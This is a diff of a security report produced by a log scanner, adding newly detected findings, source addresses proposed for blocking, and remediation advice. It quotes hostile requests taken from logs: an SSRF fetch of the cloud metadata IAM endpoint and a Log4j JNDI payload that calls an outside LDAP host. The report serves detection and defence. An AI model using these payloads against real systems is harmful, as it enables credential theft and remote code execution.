@@ -1,7 +1,7 @@
 NEXO SENTINEL - security report of the logs
 
-Scanned 4 files and 75 lines; skipped 3 files.
-Findings: 25 (high 9, medium 13, low 3)
+Scanned 5 files and 84 lines; skipped 3 files.
+Findings: 30 (high 12, medium 15, low 3)
 
 SKIPPED
   logs/binary.log         Invalid data: the file "logs/binary.log" is not UTF-8
@@ -35,21 +35,29 @@ FINDINGS
   medium    SEN-301  hidden_text           logs/unicode.log:5     198.51.100.90    GET /<control>[2Jcleared 400
   medium    SEN-301  hidden_text           logs/unicode.log:7     192.0.2.51       GET / 200
   low       SEN-302  oversized_line        logs/oversized.log:2   -                6073 characters
+  high      SEN-107  server_side_request   logs/nginx.log:4       198.51.100.210   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/ 200 "curl/8.5.0"
+  high      SEN-108  jndi_injection        logs/nginx.log:5       198.51.100.210   GET /search?q=${jndi:ldap://203.0.113.200/a} 200 "curl/8.5.0"
+  high      SEN-205  foreign_object        logs/nginx.log:6       198.51.100.220   user 42 was answered an object of user 57: GET /api/users/57/cards 200 "python-requests/2.32" user=42
+  medium    SEN-109  secret_in_request     logs/nginx.log:7       192.0.2.51       GET /reset?token=<redacted>&email=ana@example.com 200 "Mozilla/5.0 (iPhone)"
+  medium    SEN-106  scanner               logs/nginx.log:9       198.51.100.230   GET / 200 "Nikto/2.5.0"
 
 SOURCES
   ADDRESS          SCORE  HIGH  MEDIUM  LOW  PROPOSAL   RULES
   198.51.100.140   24     2     1       0    block      SEN-102, SEN-105
   203.0.113.9      20     2     0       0    block      SEN-201, SEN-202
   198.51.100.23    20     2     0       0    block      SEN-101
+  198.51.100.210   20     2     0       0    block      SEN-107, SEN-108
   198.51.100.77    16     0     4       0    watch      SEN-104, SEN-105
   198.51.100.90    12     0     3       0    watch      SEN-301
   192.0.2.10       10     1     0       0    protected  SEN-101
   198.51.100.180   10     1     0       0    block      SEN-204
   198.51.100.190   10     1     0       0    block      SEN-205
+  198.51.100.220   10     1     0       0    block      SEN-205
   198.51.100.150   8      0     2       0    watch      SEN-103
+  192.0.2.51       8      0     2       0    watch      SEN-301, SEN-109
   198.51.100.160   4      0     1       0    watch      SEN-106
   198.51.100.170   4      0     1       0    watch      SEN-203
-  192.0.2.51       4      0     1       0    watch      SEN-301
+  198.51.100.230   4      0     1       0    watch      SEN-106
 
 RECOMMENDED
   SEN-101  sql_injection         Review the queries of the endpoint; use parameters, never text put together. (CWE-89, ATT&CK T1190)
@@ -58,6 +66,9 @@ RECOMMENDED
   SEN-104  path_traversal        Resolve file names inside one folder and refuse the rest. (CWE-22)
   SEN-105  sensitive_file        Make sure the file is not served; rotate any secret that was answered with 200. (CWE-538)
   SEN-106  scanner               Expect more requests from this address; rate-limit it. (ATT&CK T1595.002)
+  SEN-107  server_side_request   Allow only the hosts the feature needs; never fetch an address a request gives. (CWE-918 (SSRF))
+  SEN-108  jndi_injection        Update Log4j and check the host for connections to the address named. (CWE-917, CVE-2021-44228)
+  SEN-109  secret_in_request     Rotate the secret: it is now in every log and proxy on the way; send secrets in a header or the body. (CWE-598)
   SEN-201  brute_force           Lock the accounts tried and require a second factor. (CWE-307, ATT&CK T1110)
   SEN-202  login_after_failures  Treat the account as compromised: end its sessions and reset its password. (ATT&CK T1078)
   SEN-203  enumeration           Rate-limit requests that are answered 404. (ATT&CK T1595.003)
@@ -68,5 +79,5 @@ RECOMMENDED
   SEN-303  malformed_line        Check what writes this log; a broken line can hide an entry. (CWE-117)
 
 The report is in report.json.
-Ask the local model for a summary? (yes/no) Proposed: block 198.51.100.140, 203.0.113.9, 198.51.100.23, 198.51.100.180, 198.51.100.190 on the firewall.
+Ask the local model for a summary? (yes/no) Proposed: block 198.51.100.140, 203.0.113.9, 198.51.100.23, 198.51.100.210, 198.51.100.180, 198.51.100.190, 198.51.100.220 on the firewall.
 Block them? (yes/no) Nothing was changed.
